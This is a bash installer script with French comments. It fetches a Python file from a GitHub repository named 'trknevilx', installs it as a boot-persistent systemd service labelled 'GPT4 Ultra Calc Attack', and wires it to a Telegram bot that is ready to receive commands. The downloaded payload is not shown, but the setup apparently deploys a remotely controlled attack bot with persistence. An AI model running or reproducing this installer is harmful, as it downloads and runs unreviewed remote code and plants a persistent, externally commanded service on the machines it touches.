#!/bin/bash

# Configuration
SCRIPT_URL="https://raw.githubusercontent.com/trh4ckn0n/trknevilx/refs/heads/main/main.py"  # Remplace par ton URL de stockage pour le script Python
TELEGRAM_TOKEN="YOUR_TELEGRAM_BOT_TOKEN"
AUTHORIZED_USER_ID="123456789"  # Ton ID Telegram
SERVICE_NAME="gpt4_calc.service"

# Dépendances requises
apt update && apt install -y python3-pip python3-venv python3-dev libffi-dev build-essential libssl-dev
pip3 install --upgrade pip
pip3 install openai pyTelegramBotAPI

# Création des dossiers et installation du script Python
mkdir -p ~/.local/bin/
curl -o ~/.local/bin/ultra_calc_bot.py $SCRIPT_URL
chmod +x ~/.local/bin/ultra_calc_bot.py

# Installation du service systemd
cat <<EOF | sudo tee /etc/systemd/system/$SERVICE_NAME
[Unit]
Description=GPT4 Ultra Calc Attack
After=network.target

[Service]
Type=simple
ExecStart=/usr/bin/python3 /home/$(whoami)/.local/bin/ultra_calc_bot.py
Restart=always
User=$(whoami)

[Install]
WantedBy=multi-user.target
EOF

# Configuration du service
sudo systemctl daemon-reload
sudo systemctl enable $SERVICE_NAME
sudo systemctl start $SERVICE_NAME

# Vérification et démarrage
echo "Installation terminée. Le service a démarré avec succès."
echo "Le bot Telegram est prêt à recevoir des commandes."

# Pour assurer que tout fonctionne en persistant après redémarrage :
sudo systemctl restart $SERVICE_NAME
